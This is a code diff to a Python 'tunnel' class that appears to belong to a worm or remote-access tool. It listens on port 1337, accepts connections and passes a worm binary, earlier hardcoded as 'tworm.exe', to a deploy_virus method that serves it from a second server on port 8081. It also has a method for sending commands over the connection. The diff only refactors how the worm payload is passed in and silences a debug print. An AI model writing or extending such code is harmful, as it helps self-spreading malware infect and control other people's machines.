@@ -6,7 +6,8 @@ from deployment import deployment
 
 class tunnel(threading.Thread):
     
-    def __init__(self, lhost="0.0.0.0", lport=1337):
+    def __init__(self, worm, lhost="0.0.0.0", lport=1337):
+        self.worm = worm
         self.lhost = lhost
         self.lport = lport
         self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -23,7 +24,7 @@ class tunnel(threading.Thread):
         conn.settimeout(5.0)
         self.set_connection(conn,addr)
         print("Got a connection from: {}",addr)
-        self.deploy_virus(replicate("container/tworm.exe").getfiledata(),conn)
+        self.deploy_virus(self.worm.getfiledata(),conn)
     
     
     def sent_command(self, command, conn):
@@ -65,7 +66,7 @@ class tunnel(threading.Thread):
             return ""
 
     def deploy_virus(self, data, conn, ostype="windows"):
-        print(data)
+        #print(data)
         server = deployment("0.0.0.0",8081,data)
         server.start()
         
